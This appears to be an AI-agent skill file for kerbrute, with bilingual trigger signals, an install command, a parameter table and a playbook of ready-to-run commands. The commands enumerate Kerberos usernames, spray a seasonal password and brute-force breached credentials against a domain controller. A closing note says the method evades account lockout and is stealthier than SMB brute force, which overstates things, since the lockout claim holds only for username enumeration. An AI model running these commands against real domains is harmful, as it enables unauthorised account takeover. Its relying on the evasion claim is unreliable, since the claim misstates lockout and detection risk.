---
name: kerbrute-kerberos-enum
description: "kerbrute performs pre-auth enumeration, password spraying, and targeted breach-password brute force. Signals: brute force, password spraying, dictionary cracking, thread count."
zh-signals: "kerbrute: 预认证枚举+口令喷洒、从 breach 密码定向爆破。信号:暴力破解,口令喷射,从密码字典爆破,线程数。"
---

# kerbrute

- 攻击大类:C28 暴力破解与口令喷射
- 上游仓库:https://github.com/ropnop/kerbrute
- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
go install github.com/ropnop/kerbrute@latest
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `userenum -d corp.local --dc dc01.corp.local users.txt` | Kerberos 用户名枚举(不锁定账户) |
| `bruteforce -d corp.local --dc dc01 passwords.txt` | 从密码字典爆破 |
| `passwordspray -d corp.local --dc dc01 users.txt Passw0rd!` | 口令喷洒 |
| `-t 20` | 线程数 |
| `-o out.txt` | 输出 |

## 攻击场景 Playbook

### 预认证枚举+口令喷洒

```bash
kerbrute userenum -d corp.local --dc dc01.corp.local names.txt -o valid.txt
kerbrute passwordspray -d corp.local --dc dc01.corp.local valid.txt 'Spring2026!' -o spray.txt
```

### 从 breach 密码定向爆破

```bash
kerbrute bruteforce -d corp.local --dc dc01.corp.local breached-creds.txt
```

## 注意事项

Kerberos 预认证错误码区分'用户不存在/密码错误/账户锁定',不触发 AD 账户锁定策略,比 SMB 爆破隐蔽。
